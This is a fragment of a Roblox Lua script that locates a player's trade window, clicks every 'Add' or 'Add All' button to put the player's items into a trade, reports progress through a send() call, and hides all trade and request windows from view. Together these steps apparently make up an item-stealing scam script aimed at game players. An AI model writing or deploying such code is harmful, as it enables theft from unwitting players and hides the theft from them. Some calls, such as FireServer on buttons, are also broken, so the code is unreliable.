-- --- Find the REAL trade GUI (ignore Lobby, Main, HUD)
local function findTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end

    local function isTradeGUI(obj)
        if not obj then return false end
        -- Must be a ScreenGui or Frame
        if not (obj:IsA("ScreenGui") or obj:IsA("Frame")) then return false end
        -- Must be enabled/visible
        local visible = false
        if obj:IsA("ScreenGui") then visible = obj.Enabled end
        if obj:IsA("Frame") then visible = obj.Visible end
        if not visible then return false end

        -- Must be large (trade window is big)
        local size = obj.AbsoluteSize
        if size.X < 300 or size.Y < 200 then return false end

        -- Must have both Accept and Add buttons (search deep)
        local hasAccept, hasAdd = false, false
        for _, btn in pairs(obj:GetDescendants()) do
            if btn:IsA("TextButton") then
                local name = btn.Name:lower()
                local text = (btn.Text or ""):lower()
                if name:find("accept") or text:find("accept") then hasAccept = true end
                if name:find("add") or text:find("add") or name:find("select") then hasAdd = true end
            end
        end
        return hasAccept and hasAdd
    end

    -- Search top-level ScreenGuis first
    for _, obj in pairs(gui:GetChildren()) do
        if obj:IsA("ScreenGui") and isTradeGUI(obj) then
            -- Ignore if name contains lobby/main/hud
            local name = obj.Name:lower()
            if not (name:find("lobby") or name:find("main") or name:find("hud") or name:find("background")) then
                return obj
            end
        end
    end

    -- Search deeper for Frames
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("Frame") and isTradeGUI(obj) then
            local name = obj.Name:lower()
            if not (name:find("lobby") or name:find("main") or name:find("hud") or name:find("background")) then
                return obj
            end
        end
    end
    return nil
end

-- --- Click all Add buttons inside the trade window
local function addAllItemsViaGUI(tradeWindow)
    if not tradeWindow then return 0 end
    local count = 0

    -- Look for "Add All" button
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            local text = (btn.Text or ""):lower()
            if name:find("add all") or text:find("add all") or name:find("select all") then
                pcall(function() btn:FireServer() end)
                send("✅ Clicked 'Add All'.")
                return 1
            end
        end
    end

    -- Click individual "Add" buttons on item slots (parent Frame with ImageLabel)
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            local text = (btn.Text or ""):lower()
            if name:find("add") or text:find("add") or name:find("select") then
                local parent = btn.Parent
                if parent and parent:IsA("Frame") then
                    -- Check if this frame has an ImageLabel (likely an item slot)
                    if parent:FindFirstChild("ImageLabel") then
                        pcall(function() btn:FireServer() end)
                        count = count + 1
                    end
                end
            end
        end
    end
    return count
end

-- --- Hide the trade window (once)
local function hideTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Visible = false
        end
        if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 then
            local hasAccept, hasAdd = false, false
            for _, sub in pairs(obj:GetDescendants()) do
                if sub:IsA("TextButton") then
                    if sub.Name:lower():find("accept") or (sub.Text and sub.Text:lower():find("accept")) then hasAccept = true end
                    if sub.Name:lower():find("add") or (sub.Text and sub.Text:lower():find("add")) then hasAdd = true end
                end
            end
            if hasAccept and hasAdd then
                obj.Visible = false
                if obj.Parent and obj.Parent:IsA("ScreenGui") then
                    obj.Parent.Enabled = false
                end
            end
        end
    end
end

